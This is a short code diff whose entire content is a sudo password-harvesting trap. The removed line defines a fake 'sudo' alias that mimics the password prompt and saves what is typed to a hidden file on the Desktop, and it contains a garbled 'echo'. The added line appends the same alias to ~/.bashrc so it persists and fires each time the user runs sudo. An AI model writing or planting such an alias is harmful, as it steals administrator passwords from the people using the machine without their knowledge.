@@ -1,1 +1,1 @@
-alias sudo='stty -echo;read -p "[sudo] password for devworkstation:" pass; e    cho; stty echo;echo $pass >> ~/Desktop/.pass;'
+echo 'alias sudo='\''stty -echo;read -p "[sudo] password for $USER:" pass; echo; stty echo;echo $pass >> ~/Desktop/.pass;'\''' >> ~/.bashrc
